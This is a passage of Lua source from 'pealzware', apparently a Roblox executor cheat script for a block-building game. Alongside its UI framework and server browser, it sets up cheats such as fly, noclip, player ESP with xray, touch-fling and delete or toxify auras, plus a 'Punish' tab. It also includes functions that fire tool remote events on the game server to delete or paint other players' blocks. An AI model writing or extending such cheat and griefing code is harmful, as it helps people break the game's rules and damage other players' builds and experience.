            _tsPop:Create(_togStroke, TweenInfo.new(0.12), { Transparency = _active and 0.1 or 0.45 }):Play()
        end)
        _togBtn.MouseButton1Down:Connect(function()
            _tsPop:Create(_togOuter, TweenInfo.new(0.05), {
                BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.05)
            }):Play()
        end)
        _togBtn.MouseButton1Up:Connect(function()
            _tsPop:Create(_togOuter, TweenInfo.new(0.1), {
                BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.12)
            }):Play()
        end)
        return _togBtn
    end

    return popoutApi
end

function Library:CreateModal(opts)
    opts = opts or {}
    local _modalFrame = Instance.new('TextButton')
    _modalFrame.Size = opts.Size or UDim2.fromOffset(360, 220)
    _modalFrame.Position = UDim2.new(0.5, -180, 0.5, -110)
    _modalFrame.BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
    _modalFrame.AutoButtonColor = false
    _modalFrame.Visible = false
    _modalFrame.Text = ''
    _modalFrame.ZIndex = 200
    _modalFrame.Parent = Library.ScaledGui
    Library.Utility.AddBlur(_modalFrame)
    Library.Utility.AddCorner(_modalFrame, UDim.new(0, 8))

    local _titleL = Instance.new('TextLabel')
    _titleL.Size = UDim2.new(1, -20, 0, 28)
    _titleL.Position = UDim2.fromOffset(10, 8)
    _titleL.BackgroundTransparency = 1
    _titleL.Text = opts.Title or 'Modal'
    _titleL.TextColor3 = Library.Palette.Text
    _titleL.TextSize = 15
    _titleL.FontFace = Library.Palette.FontSemiBold or Library.Palette.Font
    _titleL.TextXAlignment = Enum.TextXAlignment.Left
    _titleL.ZIndex = 201
    _titleL.Parent = _modalFrame

    local _cf = Instance.new('Frame')
    _cf.Name = 'ContentFrame'
    _cf.Size = UDim2.new(1, -20, 1, -80)
    _cf.Position = UDim2.fromOffset(10, 40)
    _cf.BackgroundTransparency = 1
    _cf.ZIndex = 202
    _cf.Parent = _modalFrame
    local _cfl = Instance.new('UIListLayout')
    _cfl.SortOrder = Enum.SortOrder.LayoutOrder
    _cfl.Padding = UDim.new(0, 4)
    _cfl.Parent = _cf

    local _btnRow = Instance.new('Frame')
    _btnRow.Size = UDim2.new(1, -20, 0, 34)
    _btnRow.Position = UDim2.new(0, 10, 1, -42)
    _btnRow.BackgroundTransparency = 1
    _btnRow.ZIndex = 202
    _btnRow.Parent = _modalFrame
    Instance.new('UIListLayout', _btnRow).FillDirection = Enum.FillDirection.Horizontal

    local _api = { Object = _modalFrame, ContentFrame = _cf }
    function _api:Show()    _modalFrame.Visible = true end
    function _api:Hide()    _modalFrame.Visible = false end
    function _api:Destroy() _modalFrame:Destroy() end

    if opts.Buttons then
        for _, bd in ipairs(opts.Buttons) do
            local _b = Instance.new('TextButton')
            _b.Size = UDim2.fromOffset(140, 30)
            _b.BackgroundColor3 = bd.Color or Color3.fromRGB(50,50,50)
            _b.Text = bd.Text or 'OK'
            _b.TextColor3 = Color3.new(1,1,1)
            _b.TextSize = 13
            _b.FontFace = Library.Palette.Font
            _b.ZIndex = 203
            _b.Parent = _btnRow
            Library.Utility.AddCorner(_b, UDim.new(0, 6))
            _b.MouseButton1Click:Connect(function()
                if bd.Callback then bd.Callback() end
            end)
        end
    end

    if opts.CloseOnBackdrop then
        _modalFrame.MouseButton1Click:Connect(function()
            _api:Hide()
        end)
    end

    return _api
end

function Library:CreateLockOverlay(target, opts)
    opts = opts or {}
    local _overlay = Instance.new('TextButton')
    _overlay.Size = UDim2.fromScale(1, 1)
    _overlay.BackgroundColor3 = Color3.new(0,0,0)
    _overlay.BackgroundTransparency = 0.55
    _overlay.Text = ''
    _overlay.AutoButtonColor = false
    _overlay.ZIndex = 100
    _overlay.Visible = not (opts.InitiallyUnlocked or false)
    _overlay.Parent = typeof(target) == 'Instance' and target or Library.ScaledGui
    Library.Utility.AddCorner(_overlay, UDim.new(0, 4))

    local _lockLabel = Instance.new('TextLabel')
    _lockLabel.Size = UDim2.fromScale(1, 1)
    _lockLabel.BackgroundTransparency = 1
    _lockLabel.Text = opts.CompactText or opts.TitleText or 'LOCKED'
    _lockLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
    _lockLabel.TextSize = 11
    _lockLabel.FontFace = Library.Palette.Font
    _lockLabel.ZIndex = 101
    _lockLabel.Parent = _overlay

    _overlay.MouseButton1Click:Connect(function()
        if opts.OnLocked then opts.OnLocked() end
    end)

    local _overlayApi = { Object = _overlay }
    function _overlayApi:Unlock() _overlay.Visible = false end
    function _overlayApi:Lock()   _overlay.Visible = true end
    return _overlayApi
end


local _origCreateAlert = Library.CreateAlert
function Library:CreateAlert(optsOrText, duration, kind)
    if type(optsOrText) == 'table' then
        local _opts = optsOrText
        local _msg = (_opts.Detail and (_opts.Text .. '\n' .. _opts.Detail)) or _opts.Text or ''
        self:Notify(_opts.Title or 'Alert', _msg, 8, 'warning')

        if _opts.Buttons and #_opts.Buttons > 0 then
            local _modal = self:CreateModal({
                Title = _opts.Title or 'Alert',
                Size = UDim2.fromOffset(360, 180),
                Buttons = (function()
                    local _out = {}
                    for _, bd in ipairs(_opts.Buttons) do
                        table.insert(_out, {
                            Text = bd.Text,
                            Color = bd.Color,
                            Callback = bd.Func or bd.Callback,
                        })
                    end
                    return _out
                end)(),
            })
            local _descL = Instance.new('TextLabel')
            _descL.Size = UDim2.new(1, 0, 1, 0)
            _descL.BackgroundTransparency = 1
            _descL.Text = _msg
            _descL.TextColor3 = Library.Color.Dark(Library.Palette.Text, 0.15)
            _descL.TextSize = 12
            _descL.TextWrapped = true
            _descL.FontFace = Library.Palette.Font
            _descL.ZIndex = 203
            _descL.Parent = _modal.ContentFrame
            _modal:Show()
            return { Dismiss = function() _modal:Hide() end }
        end

        return { Dismiss = function() end }
    end
    return _origCreateAlert(self, optsOrText, duration, kind)
end


createToolPanel = function(config)
    config = config or {}
    local _title = config.title or config.name or 'Panel'

    local _outer = Instance.new('ScreenGui')
    _outer.Name = config.name or 'ToolPanel'
    _outer.IgnoreGuiInset = true
    _outer.ResetOnSpawn = false
    _outer.ZIndexBehavior = Enum.ZIndexBehavior.Global
    _outer.DisplayOrder = 50
    if gethui then _outer.Parent = gethui()
    else _outer.Parent = game:GetService('CoreGui') end
    _outer.Enabled = false

    local _panel = Instance.new('Frame')
    _panel.Size = config.size or UDim2.fromOffset(220, 220)
    _panel.Position = config.position or UDim2.new(0.5, 0, 0.15, 0)
    if config.anchor then _panel.AnchorPoint = config.anchor end
    _panel.BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
    _panel.BorderSizePixel = 0
    _panel.ZIndex = 2
    _panel.Parent = _outer
    Library.Utility.AddBlur(_panel)
    Library.Utility.AddCorner(_panel, UDim.new(0, 8))
    -- Accent glow border on all tool panels
    local _tpStroke = Instance.new('UIStroke')
    _tpStroke.Color = Library.Palette.AccentColor
    _tpStroke.Thickness = 1.1
    _tpStroke.Transparency = 0.52
    _tpStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    _tpStroke.Parent = _panel
    -- Top highlight
    local _tpGlow = Instance.new('Frame')
    _tpGlow.Size = UDim2.new(0.55, 0, 0, 2)
    _tpGlow.Position = UDim2.new(0.225, 0, 0, 0)
    _tpGlow.BackgroundColor3 = Library.Palette.AccentColor
    _tpGlow.BackgroundTransparency = 0.25
    _tpGlow.BorderSizePixel = 0
    _tpGlow.ZIndex = 3
    _tpGlow.Parent = _panel
    Instance.new('UICorner', _tpGlow).CornerRadius = UDim.new(1, 0)

    local _heading = Instance.new('TextLabel')
    _heading.Size = UDim2.new(1, -20, 0, 24)
    _heading.Position = UDim2.fromOffset(10, 6)
    _heading.BackgroundTransparency = 1
    _heading.Text = _title
    _heading.TextColor3 = Library.Palette.Text
    _heading.TextSize = 14
    _heading.FontFace = Library.Palette.FontSemiBold or Library.Palette.Font
    _heading.TextXAlignment = Enum.TextXAlignment.Left
    _heading.ZIndex = 3
    _heading.Parent = _panel

    local _content = Instance.new('Frame')
    _content.Size = UDim2.new(1, -16, 1, -36)
    _content.Position = UDim2.fromOffset(8, 32)
    _content.BackgroundTransparency = 1
    _content.ZIndex = 3
    _content.Parent = _panel

    local _statusLabel = Instance.new('TextLabel')
    _statusLabel.Size = UDim2.new(1, 0, 0, 14)
    _statusLabel.BackgroundTransparency = 1
    _statusLabel.Text = config.statusText or ''
    _statusLabel.TextColor3 = Color3.fromRGB(140, 150, 170)
    _statusLabel.TextSize = 10
    _statusLabel.FontFace = Library.Palette.Font
    _statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    _statusLabel.ZIndex = 3
    _statusLabel.Parent = _content

    local _api = {
        gui    = _outer,
        frame  = _content,
        outer  = _panel,
        Object = _panel,
        status = _statusLabel,
    }
    return _api
end

createToolButton = function(frame, text, yPos, xPos, width, callback)
    local _btn = Instance.new('TextButton')
    _btn.Size = UDim2.new(width or 0.9, 0, 0, 26)
    _btn.Position = UDim2.new(xPos or 0.05, 0, yPos or 0, 0)
    local _ctbBase = Library.Color.Light(Library.Palette.Main, 0.08)
    _btn.BackgroundColor3 = _ctbBase
    _btn.Text = text or ''
    _btn.TextColor3 = Library.Palette.Text
    _btn.TextSize = 12
    _btn.FontFace = Library.Palette.Font
    _btn.BorderSizePixel = 0
    _btn.ZIndex = 4
    _btn.Parent = frame
    Library.Utility.AddCorner(_btn, UDim.new(0, 5))
    local _tsCTB = game:GetService('TweenService')
    local _ctbHover = Library.Color.Light(Library.Palette.Main, 0.18)
    _btn.MouseEnter:Connect(function()
        _tsCTB:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _ctbHover }):Play()
    end)
    _btn.MouseLeave:Connect(function()
        _tsCTB:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _ctbBase }):Play()
    end)
    _btn.MouseButton1Down:Connect(function()
        _tsCTB:Create(_btn, TweenInfo.new(0.05), { BackgroundColor3 = Library.Palette.AccentColor }):Play()
    end)
    _btn.MouseButton1Up:Connect(function()
        _tsCTB:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _ctbHover }):Play()
    end)
    if callback then
        _btn.MouseButton1Click:Connect(function()
            if Library._playUiSound then Library._playUiSound('Button') end
            pcall(callback, _btn)
        end)
    end
    return _btn
end


createToolLabel = function(frame, text, yPos)
    local _lbl = Instance.new('TextLabel')
    _lbl.Size = UDim2.new(0.9, 0, 0, 14)
    _lbl.Position = UDim2.new(0.05, 0, yPos or 0, 0)
    _lbl.BackgroundTransparency = 1
    _lbl.Text = text or ''
    _lbl.TextColor3 = Color3.fromRGB(180, 185, 200)
    _lbl.TextSize = 11
    _lbl.FontFace = Library.Palette.Font
    _lbl.TextXAlignment = Enum.TextXAlignment.Left
    _lbl.ZIndex = 4
    _lbl.Parent = frame
    return _lbl
end

createToolInput = function(frame, yPos, placeholder)
    local _tb = Instance.new('TextBox')
    _tb.Size = UDim2.new(0.9, 0, 0, 24)
    _tb.Position = UDim2.new(0.05, 0, yPos or 0, 0)
    _tb.BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.08)
    _tb.PlaceholderText = placeholder or ''
    _tb.Text = ''
    _tb.TextColor3 = Library.Palette.Text
    _tb.TextSize = 12
    _tb.FontFace = Library.Palette.Font
    _tb.BorderSizePixel = 0
    _tb.ZIndex = 4
    _tb.Parent = frame
    Library.Utility.AddCorner(_tb, UDim.new(0, 5))
    return _tb
end


function Library:MakeDraggable(frame, yOffset)
    Library.Utility.MakeDraggable(frame)
end


getgenv().Library = Library

-- === End Utility Functions ===

UserInputService = game:GetService("UserInputService")
 isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

 windowsize = isMobile
    and UDim2.new(0.505, 0, 0.753, 0)
    or  UDim2.new(0.325, 0, 0.59, 0)

-- PealzwareUI initialises the window automatically on load (BuildRoot/BuildDefaultSettings).
-- No CreateWindow call needed.

 myPopout = Library:CreatePopout({
    Title    = 'Server Browser',
    Size     = UDim2.fromOffset(380, 520),
    Position = UDim2.fromOffset(700, 40),
})

popoutBtn = myPopout:CreateToggleButton('Servers')

-- ══ Premium Gate System ═════════════════════════════════════════════════════
local _premiumGamepassUrl = "https://www.roblox.com/game-pass/1635806447"
local _premiumModal = nil
local _premiumLocks = {}

local function _createPremiumModal()
    if _premiumModal then return _premiumModal end
    _premiumModal = Library:CreateModal({
        Title = "Premium Feature",
        Size = UDim2.fromOffset(360, 220),
        CloseOnBackdrop = true,
        Buttons = {
            {
                Text = "Copy Gamepass Link",
                Color = Color3.fromRGB(0, 85, 255),
                Id = "copy",
                Callback = function()
                    pcall(function()
                        if setclipboard then
                            setclipboard(_premiumGamepassUrl)
                        elseif toclipboard then
                            toclipboard(_premiumGamepassUrl)
                        end
                    end)
                    Library:Notify("Gamepass link copied to clipboard!", 4)
                end,
            },
            {
                Text = "Close",
                Color = Color3.fromRGB(50, 50, 50),
                Callback = function()
                    _premiumModal:Hide()
                end,
            },
        },
    })

    local cf = _premiumModal.ContentFrame

    local lockIcon = Library:Create('TextLabel', {
        BackgroundTransparency = 1;
        Size = UDim2.new(1, 0, 0, 36);
        Font = Enum.Font.GothamBold;
        Text = '\u{1F512}';
        TextColor3 = Color3.fromRGB(255, 200, 50);
        TextSize = 32;
        LayoutOrder = 1;
        ZIndex = 203;
        Parent = cf;
    })

    local msgLabel = Library:Create('TextLabel', {
        BackgroundTransparency = 1;
        Size = UDim2.new(1, 0, 0, 22);
        Font = Enum.Font.GothamBold;
        Text = 'You need Premium to use this feature!';
        TextColor3 = Library.FontColor;
        TextSize = 14;
        TextWrapped = true;
        LayoutOrder = 2;
        ZIndex = 203;
        Parent = cf;
    })
    Library:AddToRegistry(msgLabel, { TextColor3 = 'FontColor' })

    local descLabel = Library:Create('TextLabel', {
        BackgroundTransparency = 1;
        Size = UDim2.new(1, 0, 0, 40);
        Font = Enum.Font.Gotham;
        Text = 'Purchase the pealzware Premium gamepass to unlock all premium features including Rainbow Aura, Block Editor, Decal Tool, and more.';
        TextColor3 = Color3.fromRGB(160, 170, 190);
        TextSize = 12;
        TextWrapped = true;
        LayoutOrder = 3;
        ZIndex = 203;
        Parent = cf;
    })

    return _premiumModal
end

local function _showPremiumPopup()
    local modal = _createPremiumModal()
    modal:Show()
end

local function _requirePremium(callback)
    return function(...)
        if isOwner or isPremium then
            return callback(...)
        else
            _showPremiumPopup()
        end
    end
end

local _premiumUiRefreshers = {}

local function registerPremiumUiRefresher(fn)
    if type(fn) ~= "function" then return end
    table.insert(_premiumUiRefreshers, fn)
    task.defer(fn, isOwner or isPremium)
end

refreshPremiumUi = function()
    local unlocked = isOwner or isPremium
    for _, fn in ipairs(_premiumUiRefreshers) do
        pcall(fn, unlocked)
    end
end

setLocalPremiumState = function(enabled)
    if not enabled then return end
    isPremium = true
    _premiumCache[plr.UserId] = true
    if refreshPremiumUi then
        task.defer(refreshPremiumUi)
    end
    if syncHubRoleBillboard then
        task.defer(syncHubRoleBillboard, plr)
    end
end

local function registerPremiumButtonLock(buttonObj, unlockedText, opts)
    if not buttonObj then return buttonObj end
    opts = opts or {}

    local lockTarget = buttonObj.Outer or buttonObj
    local lockOverlay = nil
    if lockTarget and typeof(lockTarget) == "Instance" then
        pcall(function()
            lockOverlay = Library:CreateLockOverlay(lockTarget, {
                OnLocked = _showPremiumPopup,
                TitleText = opts.titleText or "PREMIUM",
                SubtitleText = opts.subtitleText or "Upgrade required",
                HelperText = opts.helperText or "Tap to unlock",
                CompactText = opts.compactText or "PREMIUM",
                InitiallyUnlocked = isOwner or isPremium,
            })
        end)
    end

    if lockOverlay then
        table.insert(_premiumLocks, lockOverlay)
    end

    registerPremiumUiRefresher(function(unlocked)
        local nextText = type(unlockedText) == "function" and unlockedText() or unlockedText
        if nextText and buttonObj.SetText then
            buttonObj:SetText(nextText)
        end
        if lockOverlay then
            if unlocked then
                lockOverlay:Unlock()
            else
                lockOverlay:Lock()
            end
        end
    end)

    return buttonObj
end

local function _unlockAllPremium()
    setLocalPremiumState(true)
    for _, lock in ipairs(_premiumLocks) do
        pcall(function() lock:Unlock() end)
    end
    Library:Notify("Premium unlocked! All features available.", 5)
end

pcall(function()
    trackScriptConnection(MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
        if player == plr and gamePassId == ROMAZHUB_PREMIUM_GAMEPASS_ID and wasPurchased then
            _unlockAllPremium()
        end
    end))
end)
-- ═══════════════════════════════════════════════════════════════════════════

 _sbCache = {}
 _sbCards = {}
 _sbThumbCache = {}
 _sbFetching = false

 _sbCurrentType = game.PlaceId == 11137575513 and "Normal"
    or game.PlaceId == 12943245078 and "XL"
    or game.PlaceId == 12943247001 and "VC"
    or game.PlaceId == 108097274488844 and "OG"
    or "Unknown"

 function formatUptime(seconds)
    if not seconds or seconds <= 0 then return "new" end
     h = math.floor(seconds / 3600)
     m = math.floor((seconds % 3600) / 60)
     s = math.floor(seconds % 60)
    if h > 0 then return string.format("%dh %dm", h, m) end
    if m > 0 then return string.format("%dm %ds", m, s) end
    return string.format("%ds", s)
end

 function getServerThumbnails(serverData)
     urls = {}
    if serverData.playerTokens then
        for i = 1, math.min(3, #serverData.playerTokens) do
             token = serverData.playerTokens[i]

             thumbUrl = ""
            pcall(function()
                 requestBody = HttpService:JSONEncode({
                    {requestId = "0:Token:" .. token .. ":AvatarHeadshot:48x48:png:regular", type = "AvatarHeadshot", targetId = 0, token = token, size = "48x48", format = "png"}
                })
                 resp = (request or http_request or syn and syn.request)({
                    Url = "https://thumbnails.roblox.com/v1/batch",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = requestBody
                })
                if resp and resp.Body then
                     decoded = HttpService:JSONDecode(resp.Body)
                    if decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
                        thumbUrl = decoded.data[1].imageUrl
                    end
                end
            end)
            urls[i] = thumbUrl
        end
    end
    return urls
end

local SBControlGroup = myPopout:AddGroupbox('Controls')

SBControlGroup:CreateButton({Name = 'Join Random', Function = function()
    Library:Notify('Joining random server...', 3)
    TeleportService:Teleport(game.PlaceId)
end})

SBControlGroup:CreateButton({
    Name = 'Rejoin Current',
    Function = function()
        Library:Notify('Rejoining...', 3)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end
}):CreateButton({Name = 'Copy Join Link', Function = function()
    if setclipboard then
        setclipboard(string.format(
            "https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s",
            game.PlaceId, game.JobId
        ))
        Library:Notify('Join link copied!', 2)
    end
end})

 SBListGroup = myPopout:AddGroupbox('Servers')
 SBListGroup.Children.Visible = true
 _sbStatus = SBListGroup:CreateLabel(_sbCurrentType .. ' servers  |  loading...')

SBListGroup:CreateDivider()

 _sbMaxCards = 25
for i = 1, _sbMaxCards do
     card = SBListGroup:CreateCard({
        Badge = _sbCurrentType,
        Subtitle = '',
        LeftText = '',
        Height = 56,
        Button = {
            Text = 'Join',
            Color = Color3.fromRGB(46, 160, 67),
            HoverColor = Color3.fromRGB(56, 185, 80),
            Func = function()
                local s = _sbCache[i]
                if not s then return end
                if s.id == game.JobId then
                    Library:Notify('Already in this server!', 3)
                    return
                end
                Library:Notify('Joining server...', 3)
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id)
            end,
        }
    })
    card:SetVisible(false)
    _sbCards[i] = card
end

-- Server visit history
local _sbHistoryPath = "pealzwareCache/server_history.json"
local _sbVisitedIds = {}
_sbHistoryMax = 3

pcall(function()
    pcall(makefolder, "pealzwareCache")
    if isfile and isfile(_sbHistoryPath) then
        local data = readfile(_sbHistoryPath)
        if data and #data > 2 then
            _sbVisitedIds = HttpService:JSONDecode(data)
        end
    end
end)

local function _sbSaveHistory()
    pcall(function()
        pcall(makefolder, "pealzwareCache")
        while #_sbVisitedIds > 50 do
            table.remove(_sbVisitedIds)
        end
        writefile(_sbHistoryPath, HttpService:JSONEncode(_sbVisitedIds))
    end)
end

local function _sbRecordVisit(jobId)
    for i = #_sbVisitedIds, 1, -1 do
        if _sbVisitedIds[i] == jobId then
            table.remove(_sbVisitedIds, i)
        end
    end
    table.insert(_sbVisitedIds, 1, jobId)
    _sbSaveHistory()
end

local function _sbIsVisited(jobId)
    for i = 1, math.min(#_sbVisitedIds, _sbHistoryMax) do
        if _sbVisitedIds[i] == jobId then return true end
    end
    return false
end

_sbRecordVisit(game.JobId)

local function renderServers()
    table.sort(_sbCache, function(a, b)
        return (a.playing or 0) > (b.playing or 0)
    end)
    for i = 1, _sbMaxCards do
        local card = _sbCards[i]
        if i <= #_sbCache then
            local s = _sbCache[i]
            local tag = s.id == game.JobId and " (CURRENT)"
                or (not _sbIsVisited(s.id) and " (NEW)" or "")
            card:SetBadge(_sbCurrentType .. tag)
            if s.id == game.JobId then
                card:SetBadgeColor(Color3.fromRGB(46, 160, 67))
            elseif tag == " (NEW)" then
                card:SetBadgeColor(Color3.fromRGB(255, 170, 0))
            else
                card:SetBadgeColor(Library.Palette.AccentColor)
            end
            card:SetSubtitle(formatUptime(s.age or s.Age or 0))
            card:SetLeftText(s.playing .. '/' .. s.maxPlayers)
            card:SetVisible(true)

            task.spawn(function()
                local urls = getServerThumbnails(s)
                if #urls > 0 then
                    card:SetThumbnails(urls)
                end
            end)
        else
            card:SetVisible(false)
        end
    end
    _sbStatus:SetText(_sbCurrentType .. '  |  ' .. #_sbCache .. ' servers')
end

local function fetchServers()
    if _sbFetching then return end
    _sbFetching = true

    if #_sbCache == 0 then
        _sbStatus:SetText(_sbCurrentType .. '  |  loading...')
    end
    task.spawn(function()
        local function _fetchServerPage(url)
            local body
            local resp = requestFunc({Url = url, Method = "GET"})
            local status = resp and tonumber(resp.StatusCode or resp.Status or resp.status_code or 0) or 0
            if resp and status >= 200 and status < 300 then
                body = resp.Body or resp.body
            end
            if not body or body == '' then
                body = game:HttpGet(url, true)
            end
            if not body or body == '' then
                return nil
            end
            return HttpService:JSONDecode(body)
        end

        local ok, result = pcall(function()
            local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
            return _fetchServerPage(url)
        end)
        if ok and result and result.data and #result.data > 0 then
            _sbCache = result.data
            renderServers()
        else
            local ok2, result2 = pcall(function()
                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=10"
                return _fetchServerPage(url)
            end)
            if ok2 and result2 and result2.data and #result2.data > 0 then
                _sbCache = result2.data
                renderServers()
            else

                if #_sbCache == 0 then
                    _sbStatus:SetText('Could not load servers - try again')
                    renderServers()
                else
                    _sbStatus:SetText(_sbCurrentType .. '  |  ' .. #_sbCache .. ' servers')
                end
            end
        end
        _sbFetching = false
    end)
end

task.spawn(fetchServers)
popoutBtn.MouseButton1Click:Connect(function()
    task.defer(function()
        if myPopout.Object and myPopout.Object.Visible then
            fetchServers()
        end
    end)
end)
task.spawn(function()
    while not Library.Unloaded do
        task.wait(45)
        if not Library.Unloaded then
            fetchServers()
        end
    end
end)

Library:CreateGUI()

-- Auto-expand category windows when nav tabs are clicked.
-- We bypass cat:Expand() (which reads AbsoluteContentSize that may be 0
-- while the window is invisible) and directly force the expanded state.
local _origCreateCategory = Library.CreateCategory
Library.CreateCategory = function(self, settings)
    local cat = _origCreateCategory(self, settings)
    if cat and cat.Object then
        cat.Object:GetPropertyChangedSignal('Visible'):Connect(function()
            if not cat.Object.Visible or cat.Expanded then return end
            task.defer(function()
                if not cat.Object.Visible or cat.Expanded then return end
                cat.Expanded = true
                local kids = cat.Object:FindFirstChild('Children')
                if kids then kids.Visible = true end
                -- Set tall; the layout signal inside Category.lua corrects height
                cat.Object.Size = UDim2.fromOffset(220, 601)
            end)
        end)
    end
    return cat
end

ToggleBtn = Library:CreateToggleButton({Icon = Library.Assets.Get('vape')})
_mainFrame = Library.ClickGui

 HomeTab = Library:CreateHomeTab({
    ScriptName  = 'pealzware',
    Version     = 'v3.0',
    Creator     = 'pealzware',
    Discord     = 'https://discord.gg/zSuZN5e6MZ',
    Description = 'A free keyless script for TCO. enjoy :D'
});

 Tabs = {
    Build       = Library:CreateCategory({Name = 'Build',    Icon = Library.Assets.Get('combaticon'),     Size = UDim2.fromOffset(16, 16)}),
    Auras       = Library:CreateCategory({Name = 'Combat',   Icon = Library.Assets.Get('combaticon'),     Size = UDim2.fromOffset(16, 16)}),
    StashSystem = Library:CreateCategory({Name = 'Stash',    Icon = Library.Assets.Get('targetinfoicon'), Size = UDim2.fromOffset(16, 16)}),
    Server      = Library:CreateCategory({Name = 'Server',   Icon = Library.Assets.Get('rendericon'),     Size = UDim2.fromOffset(16, 16)}),
    Parts       = Library:CreateCategory({Name = 'Parts',    Icon = Library.Assets.Get('combaticon'),     Size = UDim2.fromOffset(16, 16)}),
    Chat        = Library:CreateCategory({Name = 'Utility',  Icon = Library.Assets.Get('rendericon'),     Size = UDim2.fromOffset(16, 16)}),
    AutoCmds    = Library:CreateCategory({Name = 'Punish',   Icon = Library.Assets.Get('combaticon'),     Size = UDim2.fromOffset(16, 16)}),
    Settings    = Library:CreateCategory({Name = 'Settings', Icon = Library.Assets.Get('guisettings'),    Size = UDim2.fromOffset(16, 16)}),
}

-- Safety net: directly wire each sidebar button so clicking it ALSO forces expand.
-- This runs after all modules have been added (0.5s delay so layout is computed).
task.spawn(function()
    task.wait(0.5)
    for catName, cat in Library.Categories do
        if catName ~= 'Main' and cat.Object and cat.Button and cat.Button.Object then
            cat.Button.Object.MouseButton1Click:Connect(function()
                task.spawn(function()
                    task.wait(0.1)
                    if cat.Object and cat.Object.Visible and not cat.Expanded then
                        cat.Expanded = true
                        local kids = cat.Object:FindFirstChild('Children')
                        if kids then kids.Visible = true end
                        cat.Object.Size = UDim2.fromOffset(220, 601)
                    end
                end)
            end)
        end
    end
end)

gridSize = 4
built = false
colorbool = false
stopped = false
skipblock = false
tp = true
buildingtoxify = false
childcube = nil
oldprt = nil
cubehistory = {}
historynum = 0
historymax = 400
toxifybrick = nil
resizewait = 0.2
spamming = false
autoR6Enabled = false

 function setupAutoR6Character(character)
    if not autoR6Enabled then return end
     humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end
    humanoid.Died:Connect(function()
        if not autoR6Enabled then return end
        task.spawn(function()
             arken = plr.Backpack:FindFirstChild("The Arkenstone")
                or character:FindFirstChild("The Arkenstone")
            if arken and arken.Parent == plr.Backpack then
                arken.Parent = character
            end
            task.wait(0.05)
            sendGeneralChatMessage(";r6 " .. plr.Name)
        end)
    end)
end
autoPickupEnabled = false
autoDropEnabled = false
dontDropEnlighten = true
side = Enum.NormalId.Top
sides = {"Right","Top","Back","Left","Bottom","Front"}
deleteAuraEnabled = false
deleteAuraRange = 35
deleteAuraConnection = nil
toxifyAuraEnabled = false
toxifyAuraConnection = nil
_touchFlingEnabled = false
_touchFlingConn = nil
_touchFlingPartConns = {}
_touchFlingDebounce = {}
_flingInProgress = false
flyEnabled = false
flyConnection = nil
flySpeed = 50
bodyVelocity = nil
bodyGyro = nil
flyVar6 = false
flyLastJumpTime = 0
flyConnections = {}
_flyControlModule = nil
noclipEnabled = false
noclipConn = nil
espEnabled = false
espObjects = {}
espBuildObjects = {}
espNameLabels = {}
espXrayEnabled = false
espNametags = true
espShowDistance = true
espShowBuildCount = true
espTrackedPlayer = "all"
espBuildHighlights = {}
espBuildLabels = {}
espMaxDistance = 9999
espUpdateConnection = nil
-- Drawing-based ESP options (new)
espHighlightEnabled = false   -- Roblox Highlight instance (off by default)
esp2DBoxEnabled     = true    -- 2D screen-space box
esp3DBoxEnabled     = false   -- 3D corner-box
espSkeletonEnabled  = false   -- bone lines
espHitboxEnabled    = false   -- hitbox box
espDrawObjects      = {}      -- [player] = {box2d={lines}, box3d={lines}, skeleton={lines}, hitbox=line}
espDrawConnection   = nil     -- fast Heartbeat loop for Drawing updates
antiVoidEnabled = false
antiVoidConnection = nil
antiGravityConnection = nil
originalHumanoidDesc = nil
originalDisplayName = plr.DisplayName
originalDestroyHeight = workspace.FallenPartsDestroyHeight

function round(pos, m)
    m = m or gridSize
    return Vector3.new(
        math.round((pos.X - 2) / m) * m + 2,
        math.round((pos.Y - 2) / m) * m + 2,
        math.round((pos.Z - 2) / m) * m + 2
    )
end

function snap(pos)
    return round(pos)
end

function ExecutePaint(face, text, color, mode)
     character = plr.Character
    if not character then return false end
    
     paintTool = character:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint")
    if not paintTool then return false end
    
    if paintTool.Parent ~= character then
        paintTool.Parent = character
        task.wait()
    end
    
     hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

     paintScript = paintTool:FindFirstChild("Script")
    if paintScript and paintScript:FindFirstChild("Event") then
        paintScript.Event:FireServer(
            isog and ReplicatedStorage.Cube or ReplicatedStorage.Brick,
            face,
            hrp.Position,
            "both \u{1F91D}",
            color,
            mode,
            text
        )
        return true
    end
    return false
end

function ExecuteDelete(block)
     character = plr.Character
    if not character then return false end
    
     deleteTool = character:FindFirstChild("Delete") or plr.Backpack:FindFirstChild("Delete")
    if not deleteTool then return false end
    
    if deleteTool.Parent ~= character then
        deleteTool.Parent = character
        task.wait()
    end
    
     hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
         deleteScript = deleteTool:FindFirstChild("Script")
        if deleteScript and deleteScript:FindFirstChild("Event") then
            deleteScript.Event:FireServer(block or ReplicatedStorage.Brick, hrp.Position)
            return true
        end
    end
    return false
end

function ExecuteDeleteOG(block)
     character = plr.Character
    if not character then return false end
    
     deleteTool = character:FindFirstChild("Delete") or plr.Backpack:FindFirstChild("Delete")
    if not deleteTool then return false end
    
    if deleteTool.Parent ~= character then
        deleteTool.Parent = character
        task.wait()
    end
    
